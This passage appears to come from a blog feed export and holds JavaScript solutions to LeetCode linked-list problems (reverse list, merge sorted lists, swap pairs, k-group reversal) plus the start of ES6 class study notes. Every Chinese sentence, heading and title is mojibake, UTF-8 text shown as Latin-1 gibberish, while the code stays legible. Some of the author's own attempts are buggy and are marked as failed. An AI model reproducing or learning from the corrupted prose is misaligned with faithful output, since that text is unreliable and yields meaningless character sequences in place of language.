ç§»åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p></li><li><p>å¦‚æœæŒ‡é’ˆpA ä¸ºç©ºï¼Œåˆ™å°†æŒ‡é’ˆ pA ç§»åˆ°é“¾è¡¨ headB çš„å¤´èŠ‚ç‚¹ï¼›å¦‚æœæŒ‡é’ˆ pB ä¸ºç©ºï¼Œåˆ™å°†æŒ‡é’ˆ pB ç§»åˆ°é“¾è¡¨ headA çš„å¤´èŠ‚ç‚¹ã€‚</p></li><li><p>å½“æŒ‡é’ˆ pA å’Œ pB æŒ‡å‘åŒä¸€ä¸ªèŠ‚ç‚¹æˆ–è€…éƒ½ä¸ºç©ºæ—¶ï¼Œè¿”å›å®ƒä»¬æŒ‡å‘çš„èŠ‚ç‚¹æˆ–è€… nullã€‚</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getIntersectionNode = <span class="function"><span class="keyword">function</span>(<span class="params">headA, headB</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (headA === <span class="literal">null</span> || headB === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> pA = headA, pB = headB;</span><br><span class="line">    <span class="keyword">while</span> (pA !== pB) &#123;</span><br><span class="line">        pA = pA === <span class="literal">null</span> ? headB : pA.next;</span><br><span class="line">        pB = pB === <span class="literal">null</span> ? headA : pB.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pA;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-19"><a href="#å¤æ‚åº¦åˆ†æ-19" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><p>æ—¶é—´å¤æ‚åº¦ï¼šO(m+n)ï¼Œå…¶ä¸­ m å’Œ n æ˜¯åˆ†åˆ«æ˜¯é“¾è¡¨ headA å’Œ headB çš„é•¿åº¦ã€‚ä¸¤ä¸ªæŒ‡é’ˆåŒæ—¶éå†ä¸¤ä¸ªé“¾è¡¨ï¼Œæ¯ä¸ªæŒ‡é’ˆéå†ä¸¤ä¸ªé“¾è¡¨å„ä¸€æ¬¡ã€‚</p><p>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚</p><h2 id="LeetCode206â€”â€”åè½¬é“¾è¡¨ï¼ˆâ˜†ï¼‰"><a href="#LeetCode206â€”â€”åè½¬é“¾è¡¨ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode206â€”â€”åè½¬é“¾è¡¨ï¼ˆâ˜†ï¼‰"></a>LeetCode206â€”â€”åè½¬é“¾è¡¨ï¼ˆâ˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -34"><a href="#è‡ªå·±çš„ä»£ç -34" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseList = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">while</span> (head !== <span class="literal">null</span>) &#123;</span><br><span class="line">        arr.unshift(head);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">        arr[i].next=arr[i+<span class="number">1</span>].val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>çå†™ï¼Œæ²¡æƒ³åˆ°è¿™æ˜¯åŒå‘é“¾è¡¨é¢˜ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-19"><a href="#æ€è·¯-amp-é¢˜è§£-19" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseList = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> prev = <span class="literal">null</span>, curr = head, next = head;</span><br><span class="line">    <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">        next = curr.next;</span><br><span class="line">        curr.next = prev;</span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// è§£æ„èµ‹å€¼</span></span><br><span class="line"><span class="keyword">while</span> (curr) &#123;</span><br><span class="line">    [curr.next, prev, curr] = [prev, curr, curr.next];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å®šä¹‰â€œå‰æŒ‡é’ˆ prevâ€ã€â€œå½“å‰æŒ‡é’ˆ currâ€ã€â€œåæŒ‡é’ˆ nextâ€</li><li>å¯¹åŸå§‹é“¾è¡¨æ¯ä¸ªèŠ‚ç‚¹ï¼Œé€šè¿‡å·²çŸ¥å‡½æ•° ListNode() çš„ .next åå‘ä¿®æ”¹ curr.next </li><li>æ¯æ¬¡ä¿®æ”¹èŠ‚ç‚¹å®Œæˆï¼Œæ›´æ–° prev å’Œ curr æŒ‡é’ˆ</li><li><strong>æœ€åè¿”å› prevï¼Œå³å¯è·å¾—æ•´æ¡åå‘é“¾è¡¨</strong></li></ul><h2 id="LeetCode21â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨ï¼ˆâ˜†ï¼‰"><a href="#LeetCode21â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode21â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨ï¼ˆâ˜†ï¼‰"></a>LeetCode21â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -35"><a href="#è‡ªå·±çš„ä»£ç -35" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>ä¸ä¼šã€‚ã€‚æœ‰å¤ªå¤šç§æƒ…å†µï¼Œéš¾é“éƒ½ç”¨ if åˆ¤æ–­å—ï¼Ÿï¼ˆä¸å¼€è¾Ÿæ–°çš„ç©ºé—´å‰æä¸‹ï¼‰</p><h3 id="æ€è·¯-amp-é¢˜è§£-20"><a href="#æ€è·¯-amp-é¢˜è§£-20" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><ul><li>è¿”å›å€¼ï¼šæ¯ä¸€å±‚è°ƒç”¨éƒ½è¿”å›æ’åºå¥½çš„é“¾è¡¨å¤´</li><li>ç»ˆæ­¢æ¡ä»¶ï¼šl1 ä¸ºç©ºæˆ– l2 ä¸ºç©ºæ—¶ç»“æŸ</li><li>å•å±‚é€’å½’å†…å®¹ï¼šå¦‚æœ l1 çš„ val å€¼æ›´å°ï¼Œåˆ™å°† l1.next ä¸æ’åºå¥½çš„é“¾è¡¨å¤´ç›¸æ¥ï¼Œl2 åŒç†</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTwoLists = <span class="function"><span class="keyword">function</span>(<span class="params">l1, l2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l1 === <span class="literal">null</span>) <span class="keyword">return</span> l2;</span><br><span class="line">  <span class="keyword">if</span> (l2 === <span class="literal">null</span>) <span class="keyword">return</span> l1;</span><br><span class="line">  <span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">    l1.next = mergeTwoLists(l1.next, l2);</span><br><span class="line">    <span class="keyword">return</span> l1;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    l2.next = mergeTwoLists(l1, l2.next);</span><br><span class="line">    <span class="keyword">return</span> l2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-17"><a href="#æ€è·¯2-amp-é¢˜è§£-17" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>å¼€è¾Ÿæ–°ç©ºé—´ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTwoLists = <span class="function"><span class="keyword">function</span>(<span class="params">l1, l2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mergedHead = &#123; <span class="attr">val</span> : -<span class="number">1</span>, <span class="attr">next</span> : <span class="literal">null</span> &#125;,</span><br><span class="line">        crt = mergedHead;</span><br><span class="line">    <span class="keyword">while</span>(l1 &amp;&amp; l2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(l1.val &gt; l2.val) &#123;</span><br><span class="line">            crt.next = l2;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            crt.next = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        crt = crt.next;</span><br><span class="line">    &#125;</span><br><span class="line">    crt.next = l1 || l2;</span><br><span class="line">    <span class="keyword">return</span> mergedHead.next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode24â€”â€”ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode24â€”â€”ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode24â€”â€”ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode24â€”â€”ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -36"><a href="#è‡ªå·±çš„ä»£ç -36" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> curr = head, res = curr.next;</span><br><span class="line">  <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">    <span class="keyword">let</span> next = curr.next;</span><br><span class="line">    curr.next = next.next;</span><br><span class="line">    next.next = curr;</span><br><span class="line">    curr = next.next.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡è¿‡ã€‚é€»è¾‘ä¸Šåº”è¯¥æ²¡é—®é¢˜å•Šã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-16"><a href="#æ€è·¯1-amp-é¢˜è§£-16" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><ul><li>è®¾ç½®è™šæ‹Ÿå¤´ç»“ç‚¹ dummyï¼Œå› ä¸ºçœŸå®å¤´ç»“ç‚¹è¦æ¢äººï¼Œè®¾ç½®äº† dummy åï¼Œdummy.next å°±èƒ½æ‰¾åˆ°å¤´ç»“ç‚¹ã€‚<strong>ï¼ˆæƒ³ä¸åˆ°ï¼‰</strong></li><li>å¼€å¯ while å¾ªç¯ï¼Œä¸€å¯¹ç»“ç‚¹çš„äº¤æ¢æœ‰ä¸‰ä¸ªæŒ‡é’ˆè¦æ”¹å˜ã€‚<img src="https://i.loli.net/2021/08/12/IUrsqcJ4azfjdCW.png" alt="image.png"></li><li>æŒ‡é’ˆæ¨è¿›ï¼Œå‡†å¤‡äº¤æ¢ä¸‹ä¸€å¯¹ç»“ç‚¹ã€‚</li><li>æœ€åè¿”å› dummy.next ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">  dummy.next = head;</span><br><span class="line">  <span class="keyword">let</span> prev = dummy;</span><br><span class="line">  <span class="keyword">while</span> (head &amp;&amp; head.next) &#123;</span><br><span class="line">    <span class="keyword">let</span> next = head.next;</span><br><span class="line">    <span class="comment">// ä¸‰æ­¥å®Œæˆä¸€å¯¹äº¤æ¢</span></span><br><span class="line">    head.next = next.next;</span><br><span class="line">    next.next = head;</span><br><span class="line">    prev.next = next;</span><br><span class="line"><span class="comment">// æŒ‡é’ˆæ›´æ–°</span></span><br><span class="line">    prev = head;</span><br><span class="line">    head = head.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-18"><a href="#æ€è·¯2-amp-é¢˜è§£-18" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><ul><li>äº¤æ¢å½“å‰ä¸¤ä¸ªèŠ‚ç‚¹</li><li>é€’å½’å¹¶è¿æ¥ä¸¤ç»„èŠ‚ç‚¹ã€‚å°†ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹ä½œä¸ºé€’å½’çš„å‚æ•°ï¼Œ<strong>ä¸Šä¸€ç»„å°¾éƒ¨è¿æ¥ä¸‹ä¸€ç»„å¤´éƒ¨</strong>(é€’å½’è¿”å›çš„å€¼)ã€‚</li><li>ç»ˆç»“æ¡ä»¶ã€‚å½“èŠ‚ç‚¹ä¸º null æˆ–èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸º null æ—¶ï¼Œæ— æ³•äº¤æ¢ï¼Œé€’å½’ç»“æŸã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head.next) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="keyword">var</span> v1 = head, v2 = head.next, v3 = v2.next;</span><br><span class="line">    v2.next = v1;</span><br><span class="line">    v1.next = swapPairs(v3);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode25â€”â€”K-ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨ï¼ˆâ˜†â˜†â˜†ï¼‰"><a href="#LeetCode25â€”â€”K-ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨ï¼ˆâ˜†â˜†â˜†ï¼‰" class="headerlink" title="LeetCode25â€”â€”K ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨ï¼ˆâ˜†â˜†â˜†ï¼‰"></a>LeetCode25â€”â€”K ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨ï¼ˆâ˜†â˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -37"><a href="#è‡ªå·±çš„ä»£ç -37" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>ä¸ä¼šã€‚æ€è·¯æ˜¯åœ¨ç¿»è½¬é“¾è¡¨çš„åŸºç¡€ä¸Šä¼  k ï¼Œä½†æ˜¯ä¸çŸ¥é“å¦‚ä½•åœ¨ä¸»å‡½æ•°ä¸­è°ƒç”¨ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseList = <span class="function"><span class="keyword">function</span>(<span class="params">head, count</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> prev = <span class="literal">null</span>, curr = head, next = head;</span><br><span class="line">  <span class="keyword">while</span> (count &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    next = curr.next;</span><br><span class="line">    curr.next = prev;</span><br><span class="line">    prev = curr;</span><br><span class="line">    curr = next;</span><br><span class="line">    count--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯-amp-é¢˜è§£-21"><a href="#æ€è·¯-amp-é¢˜è§£-21" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>ä¸éœ€è¦åœ¨åè½¬é“¾è¡¨ä¸­ä¼  k å€¼ã€‚åœ¨ reverseKGroup å‡½æ•°ä¸­é€šè¿‡å¾ªç¯æ‰¾åˆ°é¦–å°¾èŠ‚ç‚¹ï¼ˆheadã€tail çš„é—´éš”å°±æ˜¯ k å€¼ï¼‰ï¼Œå†é€šè¿‡é€’å½’ï¼Œä¸Šä¸€ç»„çš„å°¾èŠ‚ç‚¹é“¾æ¥ä¸‹ä¸€ç»„çš„å¤´ç»“ç‚¹ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverseKGroup</span>(<span class="params">head, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!head) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> tail = head;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; k; i++) &#123;</span><br><span class="line">    tail = tail.next;</span><br><span class="line">    <span class="keyword">if</span> (!tail) <span class="keyword">return</span> head;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> next = tail.next;</span><br><span class="line">  tail.next = <span class="literal">null</span>;</span><br><span class="line">  reverse(head);</span><br><span class="line">  <span class="comment">// æ­¤æ—¶ head ä¸ºä¸Šä¸€ç»„å°¾èŠ‚ç‚¹ï¼Œnext ä¸ºä¸‹ä¸€ç»„å¤´ç»“ç‚¹</span></span><br><span class="line">  head.next = reverseKGroup(next, k);</span><br><span class="line">  <span class="keyword">return</span> tail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params">curr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> prev = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">    <span class="keyword">var</span> next = curr.next;</span><br><span class="line">    curr.next = prev;</span><br><span class="line">    prev = curr;</span><br><span class="line">    curr = next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æ ¹æ®æå®¢æ—¶é—´ç‹äº‰è€å¸ˆçš„&lt;a href=&quot;https://time.geekbang.org/column/intro/10001730</summary>
      
    
    
    
    <category term="æ•°æ®ç»“æ„" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="æ•°ç»„" scheme="http://example.com/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>ã€é˜…è¯»ç¬”è®°ã€‘â€” â€” pinkè€å¸ˆjsè¿›é˜¶</title>
    <link href="http://example.com/2021/06/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20pink%E8%80%81%E5%B8%88js%E8%BF%9B%E9%98%B6/"/>
    <id>http://example.com/2021/06/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20pink%E8%80%81%E5%B8%88js%E8%BF%9B%E9%98%B6/</id>
    <published>2021-06-06T11:04:07.000Z</published>
    <updated>2021-07-01T13:11:45.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯æˆ‘åœ¨è·Ÿå­¦<a href="https://www.bilibili.com/video/BV1Kt411w7MP">Bç«™javascriptè§†é¢‘</a>è¿‡ç¨‹ä¸­æ‰€åšçš„ç¬”è®°ï¼Œä¹Ÿæ˜¯ä¸ºäº†åç»­æ›´å¥½çš„å¤ä¹ ï¼ˆè¿™çŸ¥è¯†è¿‡ä¸€éå®ƒä¸è¿›è„‘å­å“‡~ï¼‰</p><p>éƒ¨åˆ†å†…å®¹å‚è€ƒè‡ª<a href="https://taylor12138.gitee.io/">https://taylor12138.gitee.io/</a></p><h1 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h1><h2 id="ES6ä¸­çš„ç±»å’Œå¯¹è±¡"><a href="#ES6ä¸­çš„ç±»å’Œå¯¹è±¡" class="headerlink" title="ES6ä¸­çš„ç±»å’Œå¯¹è±¡"></a>ES6ä¸­çš„ç±»å’Œå¯¹è±¡</h2><blockquote><p>åœ¨ JavaScriptä¸­ï¼Œå¯¹è±¡æ˜¯ä¸€ç»„æ— åºçš„ç›¸å…³å±æ€§å’Œæ–¹æ³•çš„é›†åˆï¼Œæ‰€æœ‰çš„äº‹ç‰©éƒ½æ˜¯å¯¹è±¡ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²ã€æ•°å€¼ã€æ•°ç»„ã€å‡½æ•°ç­‰ã€‚</p></blockquote><h3 id="classç±»"><a href="#classç±»" class="headerlink" title="classç±»"></a>classç±»</h3><p>åœ¨ES6ä¸­æ–°å¢åŠ äº†ç±»çš„æ¦‚å¿µï¼Œå¯ä»¥ä½¿ç”¨ classå…³é”®å­—å£°æ˜ä¸€ä¸ªç±»ï¼Œä¹‹åä»¥è¿™ä¸ªç±»æ¥å®ä¾‹åŒ–å¯¹è±¡ã€‚</p><p><strong>ç±»</strong>æŠ½è±¡äº†å¯¹è±¡çš„å…¬å…±éƒ¨åˆ†ï¼Œå®ƒæ³›æŒ‡æŸå¤§ç±»ï¼ˆclassï¼‰ï¼Œè€Œ <strong>å¯¹è±¡</strong>ç‰¹æŒ‡æŸä¸€ä¸ªã€‚é€šè¿‡ç±»å®ä¾‹åŒ–<strong>ä¸€ä¸ªå…·ä½“</strong>çš„å¯¹è±¡</p><p>é¢å‘å¯¹è±¡çš„æ€ç»´ç‰¹ç‚¹ï¼š</p><ol><li>æŠ½å–ï¼ˆæŠ½è±¡ï¼‰å¯¹è±¡å…±ç”¨çš„å±æ€§å’Œè¡Œä¸ºç»„ç»‡ï¼ˆå°è£…ï¼‰æˆä¸€ä¸ª<strong>ç±»</strong>ï¼ˆæ¨¡æ¿</li><li>å¯¹ç±»è¿›è¡Œå®ä¾‹åŒ–è·å–ç±»çš„<strong>å¯¹è±¡</strong></li></ol><h3 id="åˆ›å»ºç±»"><a href="#åˆ›å»ºç±»" class="headerlink" title="åˆ›å»ºç±»"></a>åˆ›å»ºç±»</h3><p>è¯­æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name</span></span>&#123;</span><br><span class="line">  <span class="comment">// class body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®ä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> name()</span><br></pre></td></tr></table></figure><h3 id="constructor-æ„é€ å‡½æ•°"><a href="#constructor-æ„é€ å‡½æ•°" class="headerlink" title="constructor æ„é€ å‡½æ•°"></a>constructor æ„é€ å‡½æ•°</h3><p><strong>constructor()<strong>æ–¹æ³•æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼ˆé»˜è®¤æ–¹æ³•ï¼‰ï¼Œ</strong>ç”¨äºä¼ é€’å‚æ•°è¿”å›å®ä¾‹å¯¹è±¡</strong>ã€‚é€šè¿‡<strong>newå‘½ä»¤</strong>ç”Ÿæˆå¯¹è±¡å®ä¾‹æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰æ˜¾ç¤ºå®šä¹‰,ç±»å†…éƒ¨ä¼šè‡ªåŠ¨ç»™æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª **constructor()**ã€‚</p><h3 id="åˆ›å»ºç¬¬ä¸€ä¸ªç±»å’Œå¯¹è±¡"><a href="#åˆ›å»ºç¬¬ä¸€ä¸ªç±»å’Œå¯¹è±¡" class="headerlink" title="åˆ›å»ºç¬¬ä¸€ä¸ªç±»å’Œå¯¹è±¡"></a>åˆ›å»ºç¬¬ä¸€ä¸ªç±»å’Œå¯¹è±¡</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.åˆ›å»ºç±» class åˆ›å»ºä¸€ä¸ªæ˜æ˜¾ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">uname, age</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname <span class="comment">//this æŒ‡å‘åˆ›å»ºçš„å®ä¾‹  this=&gt;ldh</span></span><br><span class="line">    <span class="built_in">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.åˆ©ç”¨ç±»åˆ›å»ºå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;åˆ˜å¾·å&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="keyword">let</span> zxy = <span class="keyword">new</span> Star(<span class="string">&#x27;å¼ å­¦å‹&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ldh); <span class="comment">//  &#123;uname: &quot;åˆ˜å¾·å&quot;, age: 18&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(zxy); <span class="comment">//  &#123;uname: &quot;å¼ å­¦å‹&quot;, age: 20&#125;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„äº‹é¡¹ï¼š</p><ol><li>é€šè¿‡class å…³é”®å­—åˆ›å»ºç±», ç±»åæˆ‘ä»¬è¿˜æ˜¯ä¹ æƒ¯æ€§å®šä¹‰<strong>é¦–å­—æ¯å¤§å†™</strong></li><li>ç±»é‡Œé¢æœ‰ä¸ªconstructor å‡½æ•°,å¯ä»¥<strong>æ¥å—</strong>ä¼ é€’è¿‡æ¥çš„<strong>å‚æ•°</strong>,åŒæ—¶<strong>è¿”å›å®ä¾‹å¯¹è±¡</strong></li><li>constructor å‡½æ•° åªè¦ new ç”Ÿæˆå®ä¾‹æ—¶,å°±ä¼š<strong>è‡ªåŠ¨è°ƒç”¨</strong>è¿™ä¸ªå‡½æ•°,å¦‚æœæˆ‘ä»¬ä¸å†™è¿™ä¸ªå‡½æ•°,ç±»ä¹Ÿä¼š<strong>è‡ªåŠ¨ç”Ÿæˆ</strong>è¿™ä¸ª<strong>å‡½æ•°</strong></li><li>ç”Ÿæˆå®ä¾‹ <strong>new</strong> ä¸èƒ½çœç•¥</li><li>æœ€åæ³¨æ„è¯­æ³•è§„èŒƒ, åˆ›å»ºç±»æ—¶ <strong>ç±»å</strong>åé¢<strong>ä¸è¦åŠ å°æ‹¬å·</strong>,ç”Ÿæˆå®ä¾‹æ—¶ ç±»ååé¢<strong>åŠ å°æ‹¬å·</strong>, <strong>æ„é€ å‡½æ•°ä¸éœ€è¦åŠ  function</strong></li></ol><h3 id="ç±»ä¸­æ·»åŠ æ–¹æ³•"><a href="#ç±»ä¸­æ·»åŠ æ–¹æ³•" class="headerlink" title="ç±»ä¸­æ·»åŠ æ–¹æ³•"></a>ç±»ä¸­æ·»åŠ æ–¹æ³•</h3><p>æ³¨æ„äº‹é¡¹ï¼š</p><ol><li>ç±»é‡Œè¾¹<strong>æ‰€æœ‰å‡½æ•°ä¸éœ€è¦å†™ function å…³é”®å­—</strong></li><li>å¤šä¸ªå‡½æ•°æˆ–è€…æ–¹æ³•ä¹‹é—´<strong>ä¸éœ€è¦åŠ </strong> 